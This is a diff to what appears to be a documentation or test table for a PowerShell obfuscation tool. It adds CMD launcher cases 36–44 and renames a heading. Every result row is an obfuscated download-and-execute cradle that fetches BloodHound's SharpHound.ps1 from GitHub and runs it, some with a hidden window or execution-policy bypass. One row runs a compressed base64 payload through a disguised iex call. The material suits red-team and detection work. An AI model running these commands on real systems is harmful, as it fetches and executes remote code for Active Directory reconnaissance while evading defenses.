@@ -60,7 +60,7 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 | :---: | :---: | :---: | :---: | :--- |
 | 26 | COMPRESS | COMPRESS\1 | - |  ( nEW-ObJEct  SYSTem.iO.sTReaMreaDEr( (nEW-ObJEct SySTEM.IO.COmpRESSIon.DEfLAtEsTream([SYsTEM.iO.memoRysTrEAM][sYsTem.CONvERT]::FrOMBaSe64sTrINg('TY67EoIwEEV/hU4sTMAoola+ZqTBgsJ6Q1ZAMcski/j5OlpoeWfOOXMz+6AbTg7PzqH3DdkgzHGYnPQVSw5yZHFGvWsbtDwWexpsS2AKdo2twlHN3PmVlA4GUTVc97r36Eqy/MZFSXe5bYnMkXprNvu/IWGBMFeJSheRWU7nulSxUTCbxaCS+KJSHQEYE2mZ2Qo9k/OyqMF1H1t0Ph6N10H2/f7LvgA='), [SYSTem.iO.COmPResSioN.ComPresSIoNmOde]::DeCOmprESs)),[sysTEM.TEXT.ENCOdInG]::AScII)).REaDtOeNd()| & ( $shELLid[1]+$ShellId[13]+'x')
 
-### LAUNCHER OBFUSCATION
+### PS LAUNCHER OBFUSCATION
 | Case # | Option #1 | Option #2 | Option #3 | Result |
 | :---: | :---: | :---: | :---: | :--- |
 | 27 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\0 | POWErshell   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
@@ -72,3 +72,16 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 | 33 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\6 | PowerSHeLl  -WIndOWstYle hID   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
 | 34 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\7 | pOWERSHeLL -eXEcutIo  ByPasS   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
 | 35 | LAUNCHER | LAUNCHER\PS | LAUNCHER\PS\8 | c:\wINdoWS\sySWOw64\WinDoWsPOWerSHeLL\v1.0\powERSHELl.exe   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+
+### CMD LAUNCHER OBFUSCATION
+| Case # | Option #1 | Option #2 | Option #3 | Result |
+| :---: | :---: | :---: | :---: | :--- |
+| 36 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\0 | Cmd/C PoWERsHELl    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 37 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\1 | cMd.eXe  /C   pOwerSHEll  -Noex   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 38 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\2 | CmD/c pOwershelL  -nONInteract  "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 39 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\3 | c:\winDowS\SYStem32\CMd.EXe   /c PowersHELl  -nOLO    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 40 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\4 | C:\wiNDows\sySTEm32\CMd   /c PowErSHelL  -nOPRoFile   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 41 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\5 | cMd /C   PoWERSHeLl  -ComMaN   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 42 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\6 | C:\wIndoWS\SYsTem32\cMd.EXe   /c   PoWeRSheLL -wiNdOwsTYLE  HIDdEn   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 43 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\7 | cmD.ExE/cPOWERSHell  -ExecutiONP  bYpass   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
+| 44 | LAUNCHER | LAUNCHER\CMD | LAUNCHER\CMD\8 | c:\windoWS\sYSTEM32\Cmd.eXe   /c   C:\WindOws\sysWow64\WINdowspOWERshelL\V1.0\poWersheLl.ExE    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
